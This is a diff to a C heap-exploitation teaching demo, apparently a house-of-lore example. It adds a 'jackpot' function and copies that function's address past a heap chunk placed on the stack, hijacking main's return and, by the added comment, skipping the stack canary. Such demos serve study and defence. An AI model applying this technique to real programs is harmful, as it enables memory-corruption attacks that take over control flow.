@@ -26,6 +26,7 @@ else
 #include <string.h>
 #include <stdint.h>
 
+void jackpot(){ puts("Nice jump d00d"); exit(0); }
 
 int main(int argc, char * argv[]){
 
@@ -41,7 +42,7 @@ int main(int argc, char * argv[]){
   intptr_t *victim = malloc(100);
   printf("Allocated the first small chunk on the heap at %p\n", victim);
 
-  // victim-8 because we need to remove the header size in order to have the absolute address of the chunk
+  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
   intptr_t *victim_chunk = victim-2;
 
   printf("stack_buffer_1 at %p\n", (void*)stack_buffer_1);
@@ -105,6 +106,6 @@ int main(int argc, char * argv[]){
          stack_buffer_2[2]);
 
   printf("\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
+  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 }
-
-
